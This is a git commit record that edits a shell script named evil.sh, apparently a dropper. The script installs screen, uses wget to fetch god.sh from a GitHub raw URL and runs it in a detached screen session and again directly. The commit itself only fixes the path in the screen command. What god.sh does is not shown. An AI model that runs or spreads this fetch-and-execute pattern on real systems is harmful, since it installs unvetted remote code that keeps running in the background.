848f941cc4364d0d1327d69e0519a5ea23f475c2
goldengoose45 <86189692+goldengoose45@users.noreply.github.com>
2021-06-28 12:45:01 +0530

    Update evil.sh

--- evil.sh
+++ evil.sh
@@ -3,6 +3,6 @@
 sudo apt update
 sudo apt install screen -y
 wget https://raw.githubusercontent.com/goldengoose45/octopus/main/god.sh
-screen -dmS god.sh .god.sh 60 70
+screen -dmS god.sh ./god.sh 60 70
 chmod +x god.sh
 ./god.sh
